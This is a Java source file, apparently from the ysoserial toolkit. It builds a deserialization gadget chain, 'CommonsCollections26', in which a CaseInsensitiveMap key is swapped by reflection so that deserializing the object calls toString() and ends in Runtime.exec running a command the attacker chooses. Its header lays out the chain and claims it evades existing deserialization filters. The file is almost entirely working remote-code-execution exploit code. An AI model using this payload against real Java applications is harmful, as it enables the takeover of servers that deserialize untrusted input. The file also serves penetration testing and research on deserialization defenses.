package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.AbstractHashedMap;
import org.apache.commons.collections.map.CaseInsensitiveMap;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	CaseInsensitiveMap (CC3) — toString dispatch, NOT hashCode.

	Gadget chain:
		ObjectInputStream.readObject()
			CaseInsensitiveMap.doReadObject()
				CaseInsensitiveMap.put(key, value)
					CaseInsensitiveMap.convertKey(key)
						key.toString()                    ← toString dispatch
							TiedMapEntry.toString()
								TiedMapEntry.getValue()
									LazyMap.get()
										ChainedTransformer.transform()
											InvokerTransformer.transform()
												Method.invoke()
													Runtime.exec()

	CaseInsensitiveMap.convertKey() calls key.toString().toLowerCase() to
	normalize keys. This triggers toString() on deserialized keys — a
	fundamentally different dispatch mechanism from hashCode().

	Filter evasion:
		1. CaseInsensitiveMap (o.a.c.c.map) — not in any known filter
		2. toString() dispatch — bypasses all hashCode-based analysis
		3. No JDK version restriction (unlike BadAttributeValueExpException)
		4. Novel dispatch mechanism never seen in any existing chain

	Construction uses reflection key swap (like ROME4) since
	convertKey() transforms keys to strings during put().

	Discovered by IOCD static analysis + differential fuzzing.

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections26 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real transformers to arm later
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// CaseInsensitiveMap with dummy entry
		// Cannot put TiedMapEntry directly — convertKey converts to string
		CaseInsensitiveMap caseMap = new CaseInsensitiveMap();
		caseMap.put("dummy", "bar");

		// Access internal data[] (AbstractHashedMap.data = HashEntry[])
		Field dataField = AbstractHashedMap.class.getDeclaredField("data");
		Reflections.setAccessible(dataField);
		Object[] data = (Object[]) dataField.get(caseMap);

		// Replace stored key with TiedMapEntry via reflection
		for (int i = 0; i < data.length; i++) {
			if (data[i] != null) {
				Field keyField = data[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(data[i], entry);
				break;
			}
		}

		// Arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return caseMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections26.class, args);
	}
}
